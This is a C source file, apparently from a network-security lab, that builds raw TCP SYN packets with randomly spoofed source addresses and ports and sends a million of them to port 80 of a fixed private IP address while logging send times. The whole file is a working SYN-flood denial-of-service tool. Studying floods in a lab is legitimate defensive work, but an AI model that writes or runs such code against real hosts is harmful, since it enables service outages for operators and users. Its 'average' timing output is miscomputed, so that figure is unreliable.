/*
	Raw TCP packets
*/
#include <stdio.h>	//for printf
#include <string.h> //memset
#include <sys/socket.h>	//for socket ofcourse
#include <stdlib.h> //for exit(0);
#include <netinet/tcp.h>	//Provides declarations for tcp header
#include <netinet/ip.h>	//Provides declarations for ip header
#include <netinet/ether.h> // for ethernet header
#include <arpa/inet.h> // inet_addr
#include <unistd.h> // sleep()
#include <net/ethernet.h>
#include <sys/time.h>
#include <netinet/in.h>

#define TARGET_IP "192.168.64.6"

struct pseudohdr
{
    u_int32_t saddr;
    u_int32_t daddr;
    u_int8_t zero_part;
    u_int8_t protocol;
    u_int16_t tcp_len;
    struct tcphdr tcp;
};

unsigned short in_cksum(unsigned short *buf, int length){
    unsigned short *w = buf;
    int nleft = length;
    int sum = 0;
    unsigned short temp = 0;
    while (nleft > 1)
    {
        sum += *w++;
        nleft -= 2;
    }
    if (nleft == 1)
    {
        *(unsigned char *)(&temp) = *(unsigned char *)w;
        sum += temp;
    }
    sum = (sum >> 16) + (sum & 0xffff); // add hi 16 to low 16
    sum += (sum >> 16);					// add carry
    return (unsigned short)(~sum);
}

unsigned short calculate_tcp_checksum(struct iphdr *iph)
{
    struct tcphdr *tcp = (struct tcphdr *)((unsigned char *)iph + sizeof(struct iphdr));

    int tcp_len = ntohs(iph->tot_len) - sizeof(struct iphdr);

    /* pseudo tcp header for the checksum computation */
    struct pseudohdr hdr;
    memset(&hdr, 0, sizeof(struct pseudohdr));

    memcpy(&hdr.saddr, &iph->saddr, sizeof(hdr.saddr));
    memcpy(&hdr.daddr, &iph->daddr, sizeof(hdr.daddr));
    hdr.zero_part = 0;
    hdr.protocol = IPPROTO_TCP;
    hdr.tcp_len = htons(tcp_len);
    memcpy(&hdr.tcp, tcp, tcp_len);

    return ((unsigned short)in_cksum(((unsigned short *)&hdr), (tcp_len + 12)));
}

int main (){
    char buffer[100];
    memset(buffer,0,100);

    struct iphdr *iph = (struct iphdr *)buffer;

    iph->ihl = 5;
    iph->version = 4;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    if(inet_pton(AF_INET, TARGET_IP, &(iph->daddr)) == -1){
        perror("inet_pton error");
        exit(1);
    }
    int ipheaderlen = iph->ihl*4;
    iph->tot_len =  htons(ipheaderlen + sizeof(struct tcphdr));

    struct tcphdr *tcph =(struct tcphdr*)(buffer + ipheaderlen);
    srand((unsigned int)2); // seed random number generator

    tcph->dest = htons(80);
    tcph->th_seq = htonl(rand() % 65001);
    tcph->doff = 5;
    tcph->th_flags = TH_SYN;
    tcph->th_win = htons(64240);

    int packet_len = ipheaderlen + sizeof(struct tcphdr);

    struct sockaddr_in dest_info;
    int enable = 1;
    srand((unsigned int)2); // seed random number generator

    // Step 1: Create a raw network socket.
    int sockfd;
    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
        perror("raw_socket");
        exit(1);
    }

    // Step 2: Set socket option.
    if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL,&enable, sizeof(enable)) == -1){
        perror("setsockopt");
        exit(1);
    }

    // Step 3: Provide needed information about destination.
    dest_info.sin_family = AF_INET;
    if(inet_pton(AF_INET, TARGET_IP, &(dest_info.sin_addr.s_addr)) == -1){
        perror("inet_pton error");
        exit(1);
    }
    dest_info.sin_port = htons(80);
    memset(dest_info.sin_zero, '\0', sizeof(dest_info.sin_zero));

    struct timeval start_t, end_t, tval_result, tot_start, tot_end, tot_result; // will use them to check the timing
    FILE* file1 = fopen("syn_results_c.txt", "w+"); // open the file to write the results
    if(file1 == NULL){
        perror("fopen");
        exit(1);
    }
    fprintf(file1, "stats for syn_flood_c:\n");
    fflush(file1);

    int iter_num = 0;
    int bsent = 0; 
    char src_ip[INET_ADDRSTRLEN] = {0};

    file1 = fopen("syn_results_c.txt", "a+"); // open the file to write the results
    if(file1 == NULL){
        perror("fopen");
        exit(1);
    }
    
    gettimeofday(&tot_start, NULL);

    for(int i = 0; i < 100; i++){
        for(int j = 0; j < 10000; j++){
            memset(src_ip, 0, INET_ADDRSTRLEN);
            sprintf(src_ip, "%d.%d.%d.%d", rand() % 256, rand() % 256, rand() % 256, rand() % 256);

            tcph->th_sport = htons(rand()%(65535 - 1024 + 1) + 1024);
            if(inet_pton(AF_INET, src_ip, &(iph->saddr)) == -1){
                perror("inet_pton");
                exit(1);
            }
            tcph->th_sum = 0;
            tcph->th_sum = calculate_tcp_checksum(iph);

            gettimeofday(&start_t, NULL);
            while(bsent <= 0){
                bsent = sendto(sockfd, iph, packet_len, 0,(struct sockaddr *) &dest_info, sizeof(dest_info));
            }
            bsent = 0; 
            //printf("Packet Send. Length : %hu \n", ntohs(iph->tot_len));
            iter_num++;

            gettimeofday(&end_t, NULL); 
            timersub(&end_t, &start_t, &tval_result); 
            long int time_elapsed = tval_result.tv_sec * 1000000 + tval_result.tv_usec;
            fprintf(file1, "%d\n%ld\n", iter_num, time_elapsed);
            //printf("time elapsed: %ld\n", time_elapsed);
            //fflush(file1); 
            //sleep(1);
        }
        fflush(file1);
    }
    
    gettimeofday(&tot_end, NULL); 
    timersub(&tot_end, &tot_start, &tot_result); 
    long int tot_time_elapsed = tot_result.tv_sec*1000000 + tot_result.tv_usec;
    fprintf(file1, "total time: %ld\n", tot_time_elapsed);
    fprintf(file1, "average syn packet sending time: %ld\n", (tot_time_elapsed/1000000)); 
    fflush(file1); 
    
    printf("total time: %ld in microseconds\n", tot_time_elapsed);
    long int tot_in_seconds = tot_time_elapsed/1000000; 
    printf("total time: %ld in seconds\n", tot_in_seconds);
    printf("average syn packet sending time: %ld\n", tot_time_elapsed/1000000); 
    printf("sent total amount of %d packets\n", iter_num); 

    fclose(file1);
    close(sockfd);
    return 0;
}


